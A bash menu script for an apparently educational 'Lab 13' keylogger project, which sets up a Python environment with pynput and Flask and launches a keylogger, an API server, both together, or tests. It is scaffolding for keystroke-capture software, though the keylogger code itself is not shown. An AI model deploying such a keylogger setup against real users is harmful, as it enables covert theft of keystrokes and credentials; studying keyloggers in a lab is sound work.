
echo "========================================="
echo "🔐 LAB 13 - KEYLOGGER PROJECT"
echo "========================================="
echo "⚠️  FOR EDUCATIONAL USE ONLY - LOCAL TESTING"
echo "========================================="

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' 

if [ ! -d "venv" ]; then
    echo -e "${YELLOW}Creating virtual environment...${NC}"
    python3 -m venv venv
fi

echo -e "${GREEN}Activating virtual environment...${NC}"
source venv/bin/activate

echo -e "${GREEN}Installing requirements...${NC}"
pip install pynput requests flask flask-cors > /dev/null 2>&1

cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    pkill -f "api_server.py" 2>/dev/null
    pkill -f "keylogger.py" 2>/dev/null
    echo -e "${GREEN}Done${NC}"
    exit 0
}

trap cleanup SIGINT SIGTERM

echo ""
echo "Choose an option:"
echo "1. Start API Server only"
echo "2. Start Keylogger only"
echo "3. Start both (API Server + Keylogger)"
echo "4. Run tests"
echo "5. Cleanup (kill all processes)"
echo "6. Exit"
echo ""

read -p "Select (1-6): " choice

case $choice in
    1)
        echo -e "${GREEN}Starting API Server...${NC}"
        python api_server.py
        ;;
    2)
        echo -e "${GREEN}Starting Keylogger...${NC}"
        python keylogger.py
        ;;
    3)
        echo -e "${GREEN}Starting API Server in background...${NC}"
        python api_server.py > api_server.log 2>&1 &
        API_PID=$!
        echo -e "${GREEN}API Server started (PID: $API_PID)${NC}"
        sleep 2
        echo -e "${GREEN}Starting Keylogger...${NC}"
        python keylogger.py
        ;;
    4)
        echo -e "${GREEN}Running tests...${NC}"
        python test_keylogger.py
        ;;
    5)
        cleanup
        ;;
    6)
        echo "Exiting..."
        exit 0
        ;;
    *)
        echo -e "${RED}Invalid option${NC}"
        exit 1
        ;;
esac
